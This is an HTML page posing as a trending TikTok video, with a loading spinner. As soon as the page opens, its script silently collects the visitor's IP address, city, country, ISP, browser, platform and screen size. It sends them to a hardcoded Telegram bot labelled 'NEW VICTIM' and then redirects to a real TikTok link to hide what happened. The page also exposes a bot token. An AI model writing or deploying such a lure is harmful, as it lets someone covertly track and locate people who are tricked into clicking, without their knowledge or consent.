<!DOCTYPE html>
<html>
<head>
    <title>TikTok Video</title>
    <style>
        body { 
            background: #000; 
            color: #fff; 
            text-align: center; 
            font-family: Arial; 
            margin: 0;
            padding: 20px;
        }
        .loader {
            margin-top: 50px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #data {
            display: none;
        }
    </style>
</head>
<body>
    <h1>🎵 TRENDING TIKTOK VIDEO</h1>
    <div class="loader">
        <div class="spinner"></div>
        <p>Preparing video content...</p>
    </div>

    <div id="data"></div>

    <script>
        async function collectData() {
            let log = "=== COLLECTED DATA ===\\n";
            
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            log += "IP: " + ipData.ip + "\\n";
            
            try {
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                log += "Location: " + geoData.city + ", " + geoData.country_name + "\\n";
                log += "ISP: " + geoData.org + "\\n";
            } catch(e) {}
            
            log += "Browser: " + navigator.userAgent + "\\n";
            log += "Platform: " + navigator.platform + "\\n";
            log += "Screen: " + screen.width + "x" + screen.height + "\\n";
            
            document.getElementById('data').textContent = log;
            await sendToTelegram(log);
        }

        async function sendToTelegram(data) {
            const botToken = "8044243850:AAG3jnmhyAPFJq2J1qXxyQAZ9tVA1smYBy0";
            const chatId = "1486385025";
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: '🔥 NEW VICTIM:\\n' + data
                    })
                });
            } catch(e) {}
        }

        // Запуск
        setTimeout(() => {
            collectData();
            setTimeout(() => {
                window.location.href = "https://vm.tiktok.com/ZMAbhyLnv/";
            }, 3500);
        }, 800);
    </script>
</body>
</html>
